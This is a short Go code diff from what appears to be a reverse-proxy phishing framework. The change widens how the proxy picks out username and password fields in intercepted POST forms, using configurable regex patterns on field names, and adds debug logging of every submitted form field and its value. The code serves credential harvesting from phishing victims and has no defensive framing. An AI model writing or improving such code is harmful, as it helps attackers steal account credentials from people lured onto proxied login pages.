@@ -224,7 +224,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 						if req.ParseForm() == nil {
 							for k, v := range req.Form {
-								if k == pl.k_username {
+								log.Debug("POST %s = %s", k, v[0])
+								if (pl.k_re_username != nil && pl.k_re_username.MatchString(k)) || (pl.k_re_username == nil && k == pl.k_username) {
 									if re, err := regexp.Compile(pl.re_username); err == nil {
 										um := re.FindStringSubmatch(v[0])
 										if um != nil && len(um) > 1 {
@@ -236,7 +237,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										}
 									}
 								}
-								if k == pl.k_password {
+								if (pl.k_re_password != nil && pl.k_re_password.MatchString(k)) || (pl.k_re_password == nil && k == pl.k_password) {
 									if re, err := regexp.Compile(pl.re_password); err == nil {
 										pm := re.FindStringSubmatch(v[0])
 										if pm != nil && len(pm) > 1 {
